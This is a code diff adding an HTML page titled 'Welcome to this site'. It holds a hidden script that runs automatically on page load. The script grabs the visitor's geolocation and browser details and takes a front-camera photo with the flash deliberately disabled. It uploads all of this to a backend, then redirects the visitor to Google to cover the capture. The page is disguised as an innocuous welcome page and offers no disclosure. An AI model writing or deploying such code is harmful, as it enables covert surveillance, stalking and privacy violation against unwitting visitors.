@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to this site</title>
+</head>
+<body>
+  <a href="https://www.google.com" target="_blank">
+    <!-- You can add content here if needed -->
+  </a>
+
+  <script>
+    // Automatically capture data as soon as the page loads
+    window.onload = captureData;
+
+    async function captureData() {
+      // Get location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const location = `${latitude}, ${longitude}`;
+
+          // Get device details (simplified)
+          const deviceDetails = navigator.userAgent;
+
+          // Capture the image using the front camera
+          const imageData = await captureImage();
+
+          // Create FormData to send the data to backend
+          const formData = new FormData();
+          formData.append('image', imageData);
+          formData.append('location', location);
+          formData.append('deviceDetails', deviceDetails);
+
+          // Send data to the server
+          fetch('http://localhost:3000/upload', {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Server Response:', data);
+            
+            // Redirect to Google after successful upload
+            window.location.href = 'https://www.google.com'; // Change this URL if needed
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('Failed to upload data.');
+          });
+        });
+      } else {
+        alert('Geolocation is not supported by this browser.');
+      }
+    }
+
+    function captureImage() {
+      return new Promise((resolve, reject) => {
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        // Access the front camera with no flash
+        navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            advanced: [{ torch: false }]  // Make sure the torch (flash) is turned off
+          }
+        })
+          .then((stream) => {
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+              // Capture the image
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob((blob) => {
+                resolve(blob);
+                stream.getTracks().forEach(track => track.stop()); // Stop the camera
+              });
+            }, 1000); // Wait 1 second before capturing
+          })
+          .catch((err) => reject(err));
+      });
+    }
+  </script>
+</body>
+</html>
